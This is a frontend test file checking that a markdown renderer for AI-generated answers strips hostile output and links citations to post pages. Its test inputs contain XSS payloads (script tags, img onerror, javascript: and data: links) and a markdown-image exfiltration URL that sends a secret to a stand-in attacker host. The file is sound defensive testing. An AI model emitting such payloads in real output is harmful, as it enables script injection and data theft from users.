import { render } from "@testing-library/react";
import { describe, expect, it } from "vitest";
import type { AskSource } from "@/types/ai";
import SafeMarkdown, { linkCitations } from "./SafeMarkdown";

const sources: AskSource[] = [
  { n: 1, postId: 33, title: "มิดเทอม Signal ปี 2566" },
  { n: 2, postId: 48, title: "final Signals" },
];

function renderMd(text: string, withSources = sources) {
  return render(<SafeMarkdown sources={withSources}>{text}</SafeMarkdown>).container;
}

describe("SafeMarkdown: hostile model output", () => {
  it("never creates a <script> element", () => {
    const c = renderMd("hello <script>alert(1)</script> world");
    expect(c.querySelector("script")).toBeNull();
  });

  it("never creates an <img onerror> element or attribute", () => {
    const c = renderMd('<img src=x onerror="alert(1)">');
    expect(c.querySelector("img")).toBeNull();
    // The payload may appear as visible text, but no element may carry an event-handler attribute.
    const handlers = [...c.querySelectorAll("*")].filter((el) =>
      el.getAttributeNames().some((name) => name.startsWith("on"))
    );
    expect(handlers).toEqual([]);
  });

  it("does not parse raw HTML tags at all", () => {
    const c = renderMd('<b>bold</b> <a href="https://evil.example">x</a> <iframe src="https://evil.example"></iframe>');
    expect(c.querySelector("b")).toBeNull();
    expect(c.querySelector("a")).toBeNull();
    expect(c.querySelector("iframe")).toBeNull();
  });

  it("removes markdown images, which would leak data when loaded", () => {
    const c = renderMd("![x](https://evil.example/p.png?c=secret) and ![y](/post/1)");
    expect(c.querySelector("img")).toBeNull();
    expect(c.innerHTML).not.toContain("evil.example");
  });

  it.each([
    ["javascript:", "[click](javascript:alert(1))"],
    ["mixed-case javascript:", "[click](JaVaScRiPt:alert(1))"],
    ["data:", "[click](data:text/html,<script>alert(1)</script>)"],
    ["vbscript:", "[click](vbscript:msgbox(1))"],
  ])("renders a %s link as plain text with no href", (_name, md) => {
    const c = renderMd(md);
    expect(c.querySelector("a")).toBeNull();
    expect(c.innerHTML).not.toMatch(/href=/i);
    expect(c.textContent).toContain("click");
  });

  it("keeps the text but drops the URL of a link to another site", () => {
    const c = renderMd("[ดาวน์โหลดฟรี](https://evil.example/steal)");
    expect(c.querySelector("a")).toBeNull();
    expect(c.textContent).toContain("ดาวน์โหลดฟรี");
    expect(c.innerHTML).not.toContain("evil.example");
  });

  it.each([
    "[x](//evil.example/path)",
    "[x](/post/12abc)",
    "[x](/post/1/../../admin)",
    "[x](/admin)",
    "[x](/post/)",
    "<https://evil.example>",
    "https://evil.example/auto-linked",
    "[x][ref]\n\n[ref]: https://evil.example",
  ])("does not turn %j into a link", (md) => {
    const c = renderMd(md);
    expect(c.querySelector("a")).toBeNull();
    expect(c.innerHTML).not.toContain("evil.example\"");
  });

  it("does not let a model-written [1](url) become a link", () => {
    const c = renderMd("see [1](https://evil.example)");
    expect(c.querySelector("a")).toBeNull();
    expect(c.innerHTML).not.toContain("evil.example");
  });
});

describe("SafeMarkdown: citations", () => {
  it("turns [n] for a real source into a link to that post", () => {
    const c = renderMd("พบข้อสอบ [1] และ [2]");
    const links = [...c.querySelectorAll("a")];
    expect(links.map((a) => a.getAttribute("href"))).toEqual(["/post/33", "/post/48"]);
    expect(links.map((a) => a.textContent)).toEqual(["[1]", "[2]"]);
    for (const a of links) {
      expect(a).toHaveAttribute("target", "_blank");
      expect(a.getAttribute("rel")).toContain("noopener");
      expect(a.getAttribute("rel")).toContain("noreferrer");
    }
  });

  it("leaves [n] as plain text when there is no such source", () => {
    const c = renderMd("ตาม [7]");
    expect(c.querySelector("a")).toBeNull();
    expect(c.textContent).toContain("[7]");
  });

  it("allows a link to RuamLem's own post page", () => {
    const c = renderMd("[โพสต์](/post/5)");
    expect(c.querySelector("a")).toHaveAttribute("href", "/post/5");
  });

  it("renders ordinary markdown", () => {
    const c = renderMd("**ตัวหนา**\n\n- หนึ่ง\n- สอง");
    expect(c.querySelector("strong")?.textContent).toBe("ตัวหนา");
    expect(c.querySelectorAll("li")).toHaveLength(2);
  });
});

describe("linkCitations", () => {
  it("only rewrites citations that exist and are not already links", () => {
    expect(linkCitations("a [1] b [9] c [2](http://x)", sources)).toBe(
      "a [\\[1\\]](/post/33) b [9] c [2](http://x)"
    );
  });
});
